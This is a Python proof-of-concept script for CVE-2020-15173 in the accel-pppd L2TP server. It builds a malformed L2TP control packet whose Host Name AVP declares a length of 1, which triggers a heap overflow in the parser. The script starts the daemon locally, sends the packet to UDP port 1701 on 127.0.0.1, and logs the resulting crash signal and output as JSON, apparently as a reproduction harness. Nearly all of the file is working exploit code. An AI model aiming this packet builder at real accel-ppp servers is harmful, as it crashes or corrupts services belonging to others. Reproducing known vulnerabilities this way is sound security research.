#!/usr/bin/env python3
"""Single-shot L2TP malformed-AVP proof-of-concept for accel-pppd.

The trigger is CVE-2020-15173 / GHSA-rr68-fchr-69vf: a string AVP whose
declared AVP length is smaller than the fixed 6-byte AVP header causes an
unchecked payload-length computation and a heap overflow in the L2TP control
packet parser.
"""

import argparse
import json
import os
import signal
import socket
import struct
import subprocess
import tempfile
import time

UDP_PORT = 1701
OBSERVABLE_LIMIT = 8192


def build_trigger_payload():
    """Return one deterministic L2TP control packet.

    Layout:
      * L2TPv2 control header: T=1, L=1, S=1, version=2, length present.
      * Valid Message Type AVP (SCCRQ, type 1).
      * Malformed Host Name AVP: Hidden=0, attribute type=7, AVP length=1
        (less than the 6-byte AVP header).
    """
    # L2TP fixed control header: flags/version, length, tunnel id, session id,
    # Ns and Nr.
    header_len = 12

    # AVP 1: Message Type. mandatory flag set, length=8, vendor=0,
    # type=0, value=1 (SCCRQ).
    message_avp = struct.pack("!HHHH", 0x8008, 0, 0, 1)

    # AVP 2: Host Name string AVP with deliberately invalid length 1.  The
    # length field is still in the low 10 bits and Hidden is clear.
    malformed_avp = struct.pack("!HHH", 0x0001, 0, 7)

    body = message_avp + malformed_avp
    total_len = header_len + len(body)
    header = struct.pack("!HHHHHH", 0xC802, total_len, 0, 0, 0, 0)
    return header + body


def make_config(path):
    config = """[modules]
path=lib64/accel-ppp
l2tp

[core]
log-error=/dev/stderr
thread-count=2

[ppp]
verbose=1
mtu=1400
mru=1400

[l2tp]
verbose=1
"""
    with open(path, "w", encoding="ascii") as handle:
        handle.write(config)


def udp_listener_present():
    """Return True when a UDP socket is bound to local UDP_PORT."""
    port_hex = "%04X" % UDP_PORT
    try:
        with open("/proc/net/udp", "r", encoding="ascii") as handle:
            for line in handle:
                fields = line.split()
                if len(fields) < 2:
                    continue
                local = fields[1]
                if ":" not in local:
                    continue
                if local.rsplit(":", 1)[1].upper() == port_hex:
                    return True
    except OSError:
        pass
    return False


def send_trigger():
    payload = build_trigger_payload()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(payload, ("127.0.0.1", UDP_PORT))
    finally:
        sock.close()


def signal_name_from_returncode(returncode):
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except ValueError:
        return "SIGNAL_%d" % signum


def truncated(text, limit=OBSERVABLE_LIMIT):
    if len(text) > limit:
        return text[:limit] + "\n...[truncated %d bytes]" % (len(text) - limit)
    return text


def run_poc(binary, timeout):
    binary = os.path.realpath(binary)
    command = [binary, "--no-sigsegv", "-c", None]  # config path patched below

    if not os.path.isfile(binary):
        result = {
            "binary": binary,
            "command": command,
            "returncode": 1,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "combined_output",
                "value": "binary does not exist: %s" % binary,
                "path": None,
            },
            "error": "binary does not exist: %s" % binary,
        }
        return result

    binary_dir = os.path.dirname(binary)
    workdir = os.path.dirname(binary_dir)

    tempdir = tempfile.TemporaryDirectory(prefix="accel-ppp-poc-")
    config_path = os.path.join(tempdir.name, "accel-ppp.conf")
    make_config(config_path)
    command[3] = config_path

    started = time.monotonic()
    proc = None
    stdout = b""
    stderr = b""
    error = None

    try:
        proc = subprocess.Popen(
            command,
            cwd=workdir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True,
        )
    except OSError as exc:
        error = "failed to start daemon: %s" % exc
        elapsed_ms = int((time.monotonic() - started) * 1000)
        combined = "error: %s" % error
        result = {
            "binary": binary,
            "command": command,
            "returncode": 1,
            "signal": None,
            "timed_out": False,
            "runtime_ms": elapsed_ms,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "combined_output",
                "value": truncated(combined),
                "path": None,
            },
            "error": error,
        }
        return result

    # Give the daemon a short startup window.  Stop waiting as soon as the
    # listener appears or the process exits.
    startup_window = min(3.0, max(0.2, timeout * 0.5))
    listener_deadline = started + startup_window
    while time.monotonic() < listener_deadline:
        if proc.poll() is not None:
            break
        if udp_listener_present():
            break
        time.sleep(0.05)

    if proc.poll() is None:
        send_trigger()

    remaining = timeout - (time.monotonic() - started)
    if remaining < 0:
        remaining = 0

    timed_out = False
    try:
        if proc.poll() is None:
            stdout, stderr = proc.communicate(timeout=remaining)
        else:
            stdout, stderr = proc.communicate()
    except subprocess.TimeoutExpired:
        timed_out = True
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError):
            pass
        try:
            stdout, stderr = proc.communicate(timeout=2)
        except subprocess.TimeoutExpired:
            try:
                proc.kill()
            except (ProcessLookupError, PermissionError):
                pass
            stdout, stderr = proc.communicate()

    elapsed_ms = int((time.monotonic() - started) * 1000)
    stdout_text = stdout.decode("utf-8", errors="replace")
    stderr_text = stderr.decode("utf-8", errors="replace")
    combined = stderr_text
    if stdout_text:
        combined = stdout_text + ("\n" if not combined.endswith("\n") else "") + combined

    if proc.returncode is None:
        try:
            proc.kill()
            proc.wait(timeout=1)
        except (ProcessLookupError, subprocess.TimeoutExpired):
            pass

    result = {
        "binary": binary,
        "command": command,
        "returncode": proc.returncode,
        "signal": signal_name_from_returncode(proc.returncode),
        "timed_out": timed_out,
        "runtime_ms": elapsed_ms,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "observable": {
            "kind": "combined_output",
            "value": truncated(combined),
            "path": None,
        },
        "error": error,
    }
    return result


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Run accel-pppd with a dynamically generated malformed L2TP packet"
    )
    parser.add_argument("--binary", required=True, help="path to accel-pppd")
    parser.add_argument(
        "--json-out",
        default=None,
        help="write JSON result to this file instead of stdout",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="per-run timeout in seconds (default: 10)",
    )
    args = parser.parse_args(argv)

    result = run_poc(args.binary, args.timeout)

    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            json.dump(result, handle, indent=2)
            handle.write("\n")
    else:
        print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
